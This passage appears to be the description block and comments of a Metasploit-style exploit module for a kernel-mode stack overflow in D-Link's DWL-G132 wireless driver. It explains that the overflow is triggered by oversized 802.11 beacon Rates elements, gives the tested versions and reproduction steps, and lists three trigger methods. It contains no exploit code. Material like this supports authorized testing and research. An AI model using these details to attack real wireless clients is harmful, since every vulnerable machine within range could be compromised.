			'Description'    => %q{
					This module exploits a stack buffer overflow in the A5AGU.SYS driver provided
				with the D-Link DWL-G132 USB wireless adapter. This stack buffer overflow
				allows remote code execution in kernel mode. The stack buffer overflow is triggered
				when a 802.11 Beacon frame is received that contains a long Rates information
				element. This exploit was tested with version 1.0.1.41 of the
				A5AGU.SYS driver and a D-Link DWL-G132 USB adapter (HW: A2, FW: 1.02). Newer
				versions of the A5AGU.SYS driver are provided with the D-Link WUA-2340
				adapter and appear to resolve this flaw, but D-Link does not offer an updated
				driver for the DWL-G132. Since this vulnerability is exploited via beacon frames,
				all cards within range of the attack will be affected. The tested adapter used
				a MAC address in the range of 00:11:95:f2:XX:XX.

				Vulnerable clients will need to have their card in a non-associated state
				for this exploit to work. The easiest way to reproduce this bug is by starting
				the exploit and then accessing the Windows wireless network browser and
				forcing it to refresh.

				D-Link was NOT contacted about this flaw. A search of the SecurityFocus
				database indicates that D-Link has not provided an official patch or
				solution for any of the seven flaws listed at the time of writing:
				(BIDs 13679, 16621, 16690, 18168, 18299, 19006, and 20689).

				As of November 17th, 2006, D-Link has fixed the flaw it the latest version of the
				DWL-G132 driver (v1.21).

				This module depends on the Lorcon2 library and only works on the Linux platform
				with a supported wireless card. Please see the Ruby Lorcon2 documentation
				(external/ruby-lorcon/README) for more information.

# The following research was provided by Gil Dabah of ZERT
#
# The long rates field bug can be triggered three different ways (at least):
# 1) Send a single rates IE with valid rates up front and long data
# 2) Send a single rates IE field with valid rates, follow with IE type 0x32 with long data
# 3) Send two IE rates fields, with the second one containing the long data (this exploit)
